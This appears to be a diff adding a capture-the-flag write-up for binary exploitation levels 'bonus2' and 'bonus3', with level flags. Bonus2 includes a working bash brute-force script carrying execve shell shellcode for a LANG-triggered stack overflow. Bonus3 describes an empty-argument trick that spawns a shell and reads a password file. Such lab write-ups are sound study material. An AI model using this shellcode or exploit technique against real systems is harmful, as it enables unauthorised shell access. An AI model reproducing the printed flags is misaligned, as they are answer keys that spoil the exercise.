@@ -82,3 +82,44 @@ So, the first parameter is -2147483637 and the second is 40 random bytes + "FLOW
 ./bonus1 -2147483637 "0123456789012345678901234567890123456789FLOW"
 cat /home/user/bonus2/.pass
 flag = 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+bonus2
+
+binary seem to need two arguments to work
+For the first argument it take the first 40 bytes and if its the max the second argument is concatened to it and if the second is too long with the first one too it will segfault
+Usng gdb and ghidra we can examine the binary to see what happen.
+it segfault at the return of the function "greetuser", looking the return address we can see that half of it is a part of the second argumen
+So the problem is we cant actually inject and address there as only half of it will replace it.
+In ghidra we can see that it does diffenret greet difined with the language in env
+seem like we can use english finnish or dutch. So we will use the finnish one. As the new greet is longer than the english one ("Hello"/"Goedemiddag") we can now replace correctly the return address of the greetuser function
+we can now inject the shellcode for the first argument (+ char filler) and for the second argument some char filler and then the address of the string containing the shellcode to start a shell. Using a script to try different and match the right address
+
+export LANG=nl = instead of Hello => Goedemiddag! => buffer overflow
+
+#!/bin/bash
+
+i=100
+
+while [ $i  -lt 255 ]
+do
+   x=`printf "\x%02x\n"  $i`
+echo -n -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" > /tmp/b21 && echo -n -e "01234567890123456789012" > /tmp/b22 && echo -n -e $x >> /tmp/b22 && echo -e "\xf5\xff\xbf" >> /tmp/b22 && ~/bonus2 `cat /tmp/b21` `cat /tmp/b22`
+   echo $x
+   i=`expr $i + 1`
+done
+
+flag = 71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+
+bonus3
+
+Binary need one argument to run but only display a newline.
+Using gdb and ghidra to go through the asm we can see that the binary use fopen on "/home/user/end/.pass"
+fread on the fd opened
+atoi on the first argument of the program
+put a \0 in the string read by fread on the place found by atoi
+then it compare the string read by fread and the second argument
+if its correct it start a shell, otherwise it use puts to write the rest of the file (nothing)
+knowing that we just need to execute the binary with argument ""
+that mean atoi will be equal to 0 we will replace the first char by \0 and so strcmp will compare two empty string and then start a shell
+cat /home/user/end/.pass
+flag = 3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
